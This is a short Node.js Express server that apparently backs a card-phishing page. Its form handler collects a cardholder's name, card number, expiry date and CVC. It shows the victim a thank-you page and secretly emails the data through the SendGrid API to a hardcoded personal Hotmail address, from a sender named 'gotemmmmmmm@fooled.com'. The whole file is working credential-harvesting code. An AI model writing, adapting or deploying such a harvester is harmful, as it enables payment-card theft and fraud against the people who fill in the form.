const express = require('express');
const app = express();
const path = require('path');
const bodyParser = require('body-parser');
var request = require('request');

app.use(bodyParser.urlencoded({extended:false}));
app.use(express.static(__dirname + '/public'));

app.get('/', function(req,res) {
	res.sendFile(path.join(__dirname + '/index.html'));
});

app.get('/thankyou',function(req,res){
	res.sendFile(path.join(__dirname + '/thankyou.html'));
});


app.post('/info_submit', function(req,res){
	sendtoapi(req.body.txtcardname,req.body.txtcardnum,req.body.txtdate,req.body.txtcvc);
	res.sendFile(path.join(__dirname + '/thankyou.html'));
});

function sendtoapi(txtcardname,txtcardnum,txtdate,txtcvc){
	var postData = {
	  "personalizations": [
	    {
	        "to": [
	            {
	                "email": "stanley.k.wong@hotmail.com"
	            }
	          ],
	          "subject": "Submission of WebApp Data"
	    }
	  ],
	  "from": {
	    "email": "gotemmmmmmm@fooled.com"
	  },
	  "content": [
	    {
	      "type": "text/plain",
	      "value": "Greetings Chad. Chad, the data is:\nName: " + txtcardname + "\n Number: " + txtcardnum +
	              "\nExpiry: " + txtdate + "\nCVC: " + txtcvc
	    }
	  ]
	}
	var clientServerOptions = {
                uri: 'https://api.sendgrid.com/v3/mail/send',
                body: JSON.stringify(postData),
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
										'authorization': 'Bearer APIKEYHERE'
                }
            }
  request(clientServerOptions, function (error, response) {
    console.log(error,response.body);
    return;
  });
}

app.listen(3000);
